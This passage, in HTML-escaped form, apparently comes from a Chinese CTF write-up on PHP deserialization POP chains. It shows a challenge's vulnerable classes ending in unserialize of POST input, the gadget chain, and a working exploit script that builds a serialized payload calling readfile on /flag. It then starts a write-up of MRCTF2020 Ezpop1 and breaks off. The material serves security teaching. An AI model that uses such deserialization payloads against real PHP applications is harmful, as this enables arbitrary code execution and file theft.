class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__toString&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;) //把对象当作字符串时触发&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        (&lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;func)(); &lt;span class=&#34;comment&#34;&gt;//把对象当作方法（函数），触发__invoke&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Good Job!&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Handle&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$obj&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__call&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$func&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$vars&lt;/span&gt;&lt;/span&gt;) //调用不可访问的方法时触发&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;obj-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;end&lt;/span&gt;(); &lt;span class=&#34;comment&#34;&gt;//调用end函数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Super&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$obj&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__invoke&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;) //将对象调用为函数时触发&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;obj-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;getStr&lt;/span&gt;(); &lt;span class=&#34;comment&#34;&gt;//不存在getStr方法，触发__call&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;end&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;) //错误的&lt;span class=&#34;title&#34;&gt;end&lt;/span&gt;函数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;==GAME OVER==&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;CTF&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$handle&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;end&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;) // 正确的&lt;span class=&#34;title&#34;&gt;end&lt;/span&gt;函数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;unset&lt;/span&gt;(&lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;handle-&amp;gt;log); &lt;span class=&#34;comment&#34;&gt;//handle-&amp;gt;log不可访问，触发__unset&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;WhiteGod&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$func&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$var&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__unset&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$var&lt;/span&gt;&lt;/span&gt;) //在不可访问的属性上使用&lt;span class=&#34;title&#34;&gt;unset&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)时触发&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        (&lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;func)(&lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;&lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//可以构造执行系统命令,比如:system(ls /)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@&lt;span class=&#34;title function_ invoke__&#34;&gt;unserialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;pop&amp;#x27;&lt;/span&gt;]); &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;由此可以构造出 POP 链子&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Begin::__destruct -&amp;gt; Then::toString -&amp;gt; Super::__invoke -&amp;gt; Handle::__call -&amp;gt; CTF::end -&amp;gt; WhiteGod::__unset&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;由于链子调用中成员属性有 private 和 protected，用 construct 方法去调用链子，最后再使用 url 编码绕过&lt;/p&gt;
&lt;p&gt;exp&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Php&#34;&gt;&lt;figure class=&#34;iseeu highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Begin&lt;/span&gt;&lt;/span&gt;&amp;#123;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$name&lt;/span&gt;;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;&lt;/span&gt;)    &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;name = &lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Then&lt;/span&gt;&lt;/span&gt;&amp;#123;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$func&lt;/span&gt;;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;&lt;/span&gt;)    &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;func= &lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Handle&lt;/span&gt;&lt;/span&gt;&amp;#123;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$obj&lt;/span&gt;;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;&lt;/span&gt;)    &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;obj = &lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Super&lt;/span&gt;&lt;/span&gt;&amp;#123;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$obj&lt;/span&gt;;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;&lt;/span&gt;)    &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;obj = &lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;CTF&lt;/span&gt;&lt;/span&gt;&amp;#123;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$handle&lt;/span&gt;;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;&lt;/span&gt;)    &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;handle = &lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;WhiteGod&lt;/span&gt;&lt;/span&gt;&amp;#123;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$func&lt;/span&gt;;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$var&lt;/span&gt;;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt;&lt;/span&gt;)    &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;func = &lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;&lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt;;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Begin&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Then&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Super&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Handle&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;CTF&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;WhiteGod&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;readfile&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;/flag&amp;quot;&lt;/span&gt;))))));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;urlencode&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;serialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;稍微总结一下，POP 链的头一般是 GET/POST 传参引发 &lt;code&gt;__wakeup&lt;/code&gt;  ,  &lt;code&gt;__construct&lt;/code&gt;  ,  &lt;code&gt;__destruct&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;结尾一般是输出敏感信息或者执行系统命令所在函数，即 GetFlag 的点&lt;/p&gt;
&lt;h5 id=&#34;mrctf2020ezpop1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mrctf2020ezpop1&#34;&gt;#&lt;/a&gt; [MRCTF2020]Ezpop1&lt;/h5&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Php&#34;&gt;&lt;figure class=&#34;iseeu highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span 